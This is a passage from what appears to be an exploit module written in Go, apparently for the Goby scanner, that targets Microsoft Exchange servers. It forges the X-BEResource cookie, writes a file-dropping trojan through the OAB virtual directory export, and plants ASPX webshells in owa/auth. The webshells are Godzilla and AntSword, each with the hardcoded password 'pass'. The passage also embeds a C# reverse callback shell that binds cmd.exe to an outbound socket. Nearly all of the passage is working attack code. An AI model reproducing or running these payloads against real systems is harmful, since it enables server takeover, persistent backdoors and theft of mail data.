pStringSid);\n\n\n   [DllImport(\"kernel32.dll\", SetLastError = true)]\n   public static extern bool CloseHandle(\n       IntPtr hHandle);\n\n   [DllImport(\"kernel32.dll\", SetLastError = true)]\n   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);\n   [Flags]\n   public enum ProcessAccessFlags : uint\n   {\n       All = 0x001F0FFF,\n       Terminate = 0x00000001,\n       CreateThread = 0x00000002,\n       VMOperation = 0x00000008,\n       VMRead = 0x00000010,\n       VMWrite = 0x00000020,\n       DupHandle = 0x00000040,\n       SetInformation = 0x00000200,\n       QueryInformation = 0x00000400,\n       Synchronize = 0x00100000\n   }\n\n   [DllImport(\"kernel32.dll\")]\n   static extern IntPtr GetCurrentProcess();\n\n   [DllImport(\"kernel32.dll\")]\n   extern static IntPtr GetCurrentThread();\n\n\n   [DllImport(\"kernel32.dll\", SetLastError = true)]\n   [return: MarshalAs(UnmanagedType.Bool)]\n   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,\n      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,\n      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);\n\n    [DllImport(\"psapi.dll\", SetLastError = true)]\n    public static extern bool EnumProcessModules(IntPtr hProcess,\n    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,\n    uint cb,\n    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);\n\n    [DllImport(\"psapi.dll\")]\n    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);\n\n    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;\n    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;\n    public const uint PIPE_ACCESS_INBOUND = 0x00000001;\n    public const uint PIPE_WAIT = 0x00000000;\n    public const uint PIPE_NOWAIT = 0x00000001;\n    public const uint PIPE_READMODE_BYTE = 0x00000000;\n    public const uint PIPE_READMODE_MESSAGE = 0x00000002;\n    public const uint PIPE_TYPE_BYTE = 0x00000000;\n    public const uint PIPE_TYPE_MESSAGE = 0x00000004;\n    public const uint PIPE_CLIENT_END = 0x00000000;\n    public const uint PIPE_SERVER_END = 0x00000001;\n    public const uint PIPE_UNLIMITED_INSTANCES = 255;\n\n    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;\n    public const uint NMPWAIT_NOWAIT = 0x00000001;\n    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;\n\n    public const uint GENERIC_READ = (0x80000000);\n    public const uint GENERIC_WRITE = (0x40000000);\n    public const uint GENERIC_EXECUTE = (0x20000000);\n    public const uint GENERIC_ALL = (0x10000000);\n\n    public const uint CREATE_NEW = 1;\n    public const uint CREATE_ALWAYS = 2;\n    public const uint OPEN_EXISTING = 3;\n    public const uint OPEN_ALWAYS = 4;\n    public const uint TRUNCATE_EXISTING = 5;\n\n    public const int INVALID_HANDLE_VALUE = -1;\n\n    public const ulong ERROR_SUCCESS = 0;\n    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;\n    public const ulong ERROR_PIPE_BUSY = 231;\n    public const ulong ERROR_NO_DATA = 232;\n    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;\n    public const ulong ERROR_MORE_DATA = 234;\n    public const ulong ERROR_PIPE_CONNECTED = 535;\n    public const ulong ERROR_PIPE_LISTENING = 536;\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    public static extern IntPtr CreateNamedPipe(\n        String lpName,\t\t\t\t\t\t\t\t\t\n        uint dwOpenMode,\t\t\t\t\t\t\t\t\n        uint dwPipeMode,\t\t\t\t\t\t\t\t\n        uint nMaxInstances,\t\t\t\t\t\t\t\n        uint nOutBufferSize,\t\t\t\t\t\t\n        uint nInBufferSize,\t\t\t\t\t\t\t\n        uint nDefaultTimeOut,\t\t\t\t\t\t\n        IntPtr pipeSecurityDescriptor\n        );\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    public static extern bool ConnectNamedPipe(\n        IntPtr hHandle,\n        uint lpOverlapped\n        );\n\n    [DllImport(\"Advapi32.dll\", SetLastError = true)]\n    public static extern bool ImpersonateNamedPipeClient(\n        IntPtr hHandle);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    public static extern bool GetNamedPipeHandleState(\n        IntPtr hHandle,\n        IntPtr lpState,\n        IntPtr lpCurInstances,\n        IntPtr lpMaxCollectionCount,\n        IntPtr lpCollectDataTimeout,\n        StringBuilder lpUserName,\n        int nMaxUserNameSize\n        );\n \n    protected void CallbackShell(string server, int port)\n    {\n\n        string request = \"Spawn Shell...\\n\";\n        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);\n\n        IntPtr oursocket = IntPtr.Zero;\n        \n        sockaddr_in socketinfo;\n        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);\n        socketinfo = new sockaddr_in();\n        socketinfo.sin_family = (short) AddressFamily.InterNetwork;\n        socketinfo.sin_addr = inet_addr(server);\n        socketinfo.sin_port = (short) htons((ushort)port);\n        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));\n        send(oursocket, bytesSent, request.Length, 0);\n        SpawnProcessAsPriv(oursocket);\n        closesocket(oursocket);\n    }\n\n    protected void SpawnProcess(IntPtr oursocket)\n    {\n        bool retValue;\n        string Application = Environment.GetEnvironmentVariable(\"comspec\"); \n        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();\n        STARTUPINFO sInfo = new STARTUPINFO();\n        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();\n        pSec.Length = Marshal.SizeOf(pSec);\n        sInfo.dwFlags = 0x00000101;\n        sInfo.hStdInput = oursocket;\n        sInfo.hStdOutput = oursocket;\n        sInfo.hStdError = oursocket;\n        retValue = CreateProcess(Application, \"\", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);\n        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);\n    }\n\n    protected void SpawnProcessAsPriv(IntPtr oursocket)\n    {\n        bool retValue;\n        string Application = Environment.GetEnvironmentVariable(\"comspec\"); \n        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();\n        STARTUPINFO sInfo = new STARTUPINFO();\n        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();\n        pSec.Length = Marshal.SizeOf(pSec);\n        sInfo.dwFlags = 0x00000101; \n        IntPtr DupeToken = new IntPtr(0);\n        sInfo.hStdInput = oursocket;\n        sInfo.hStdOutput = oursocket;\n        sInfo.hStdError = oursocket;\n        if (DupeToken == IntPtr.Zero)\n            retValue = CreateProcess(Application, \"\", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);\n        else\n            retValue = CreateProcessAsUser(DupeToken, Application, \"\", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);\n        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);\n        CloseHandle(DupeToken);\n    }\n    </script>\n"
			} else if attackType == "webshell" {
				if webshell == "godzilla" {
					// 改过的马 session改成Application
					filename = goutils.RandomHexString(6) + ".aspx"
					content = "<%@ Page Language=\"C#\"%><%try {     string key = \"3c6e0b8a9c15224a\";     string pass = \"pass\";     string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(\"-\", \"\");     byte[] data = System.Convert.FromBase64String(Context.Request[pass]);     data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);         if (Application[\"payload\"] == null)     {         Application[\"payload\"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(\"Load\", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });     }     else     {         System.IO.MemoryStream outStream = new System.IO.MemoryStream();         object o = ((System.Reflection.Assembly)Application[\"payload\"]).CreateInstance(\"LY\");         o.Equals(Context);         o.Equals(outStream);         o.Equals(data);         o.ToString();         byte[] r = outStream.ToArray();         Context.Response.Write(md5.Substring(0, 16));         Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));         Context.Response.Write(md5.Substring(16));     } } catch (System.Exception) { }%>"
				} else if webshell == "antsword" {
					// 蚁剑连接的时候要选忽略 https 证书
					filename = goutils.RandomHexString(6) + ".aspx"
					content = "<%@ Page Language=\"Jscript\"%> <%eval(Request.Item[\"pass\"],\"unsafe\");%>"
				} else if webshell == "custom" {
					filename = goutils.B2S(stepLogs.Params["filename"])
					content = goutils.B2S(stepLogs.Params["content"])
				} else {
					expResult.Success = false
					expResult.Output = `未知的的利用方式`
					return expResult
				}
			}
			// 命令执行会每次执行新命令就重新发包一次，所以先检查命令执行马是否存在，如果存在就不进行下面的操作，直接发包执行命令，不存在的话，再重新获取 Token
			//cmdFileCheck, err := checkFileG37RdFYc8(expResult.HostInfo, "comexchange.aspx")
			//cmdFileCheck, err := checkFileG37RdFYc8(expResult.HostInfo, "exchanges28.aspx")
			checkConfig := httpclient.NewPostRequestConfig("/owa/auth/exchanges28.aspx")
			checkConfig.VerifyTls = false
			checkConfig.FollowRedirect = false
			checkConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			checkConfig.Data = `filename=1.txt&content=1`
			cmdFileCheck, err := httpclient.DoHttpRequest(expResult.HostInfo, checkConfig)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			} else if cmdFileCheck != nil && cmdFileCheck.StatusCode != 200 {
				// 获取一系列 ID
				fqdn, err := fetchFqdnG37RdFYc8(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				serverId, err := generateGetUserIdPayloadG37RdFYc8(expResult.HostInfo, email, "serverID", fqdn)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				sid, err := fetchUserIdG37RdFYc8(expResult.HostInfo, email, fqdn, serverId)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				msExchEcpCanary, err := fetchSessionIdG37RdFYc8(expResult.HostInfo, "msExchEcpCanary", fqdn, sid)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				sessId, err := fetchSessionIdG37RdFYc8(expResult.HostInfo, "sessId", fqdn, sid)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				oabId, err := fetchDefaultOabG37RdFYc8(expResult.HostInfo, fqdn, sid, msExchEcpCanary, sessId)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				// 传小马
				Trojan := "<script language=\\\"JScript\\\" runat=\\\"server\\\">function Page_Load(){var file = new ActiveXObject(\\\"Scripting.FileSystemObject\\\").CreateTextFile(Request[\\\"filename\\\"], true);file.WriteLine(Request[\\\"content\\\"]);file.Close();}</script>"
				verify, err := oabShellG37RdFYc8(expResult.HostInfo, fqdn, sid, msExchEcpCanary, sessId, oabId, Trojan)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				// oab export shell，小马的名称固定 exchanges28.aspx
				shellPath := `\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\exchanges28.aspx`
				oabJson := fmt.Sprintf("{\"identity\": {\"__type\": \"Identity:ECP\", \"DisplayName\": \"OAB (Default Web Site)\", \"RawIdentity\": \"%s\"}, \"properties\": {\"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\", \"FilePathName\": \"%s\"}}}", oabId, shellPath)
				if verify {
					resp, err := constructPostPacketG37RdFYc8(expResult.HostInfo, map[string]string{
						"Cookie":             fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", fqdn, msExchEcpCanary, sessId, msExchEcpCanary),
						"Content-Type":       "application/json; charset=utf-8",
						"X-Requested-With":   "XMLHttpRequest",
						"msExchLogonMailbox": sid,
					}, oabJson)
					if err != nil {
						expResult.Output = err.Error()
						return expResult
					} else if resp != nil && resp.StatusCode != 200 {
						expResult.Output = err.Error()
						return expResult
					}
					time.Sleep(time.Second * 2)
				}
			}
			resp, err := executeG37RdFYc8(expResult.HostInfo, content, filename)
			if attackType == "cmd" && resp != nil && resp.StatusCode == 200 {
				expResult.Output = resp.Utf8Html
				expResult.Success = true
			} else if attackType == "webshell" && resp != nil && resp.StatusCode == 200 && !strings.Contains(resp.Utf8Html, "OAB (Default Web Site)") {
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/owa/auth/" + filename + "\n"
				if webshell == "antsword" {
					expResult.Output += "Password: pass\n"
					expResult.Output += "WebShell tool: Antsword v4.0\n"
					expResult.Output += "连接时勾选忽略 https 证书选项\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：CSHAP_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: aspx"
			} else if attackType == "reverse" {
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
